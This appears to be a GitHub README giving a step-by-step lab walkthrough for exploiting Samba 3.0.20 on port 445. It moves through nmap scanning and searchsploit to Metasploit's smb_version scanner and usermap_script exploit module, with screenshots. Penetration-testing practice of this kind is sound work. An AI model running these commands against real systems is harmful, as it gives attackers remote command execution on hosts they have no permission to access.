# Port-445-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-
1.nmap -sV (target ip)

2.msfconsole

3.msf 6 > search smb
![image](https://github.com/thanawut2903/Port-445-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/54030f2b-ef38-4e25-94d9-bf96fc4259e0)
4.msf 6 > use auxiliary/scanner/smb/smb_version

5.msf 6 > show options 

6.msf 6 > set RHOST (target ip)
![image](https://github.com/thanawut2903/Port-445-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/d7f57e35-b032-47d3-b85f-7ed2fe897c29)
7.msf 6 > run
![image](https://github.com/thanawut2903/Port-445-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/2cba8e7d-3caf-41f0-b895-feaee41332c4)
8.searchsploit samba | grep 3.0.20
![image](https://github.com/thanawut2903/Port-445-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/8a236e61-fe1b-4d4f-ba8c-0c765cc3f7c7)
9.msf 6 > use exploit/multi/samba/usermap_script

10.msf 6 > show options

11.msf 6 > set RHOST (target ip)

12.msf 6 > exploit
![image](https://github.com/thanawut2903/Port-445-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/0acce98f-8c0f-41e5-bf66-556cb9beace3)

Reference form : https://www.youtube.com/watch?v=Eqsilc8HoPI
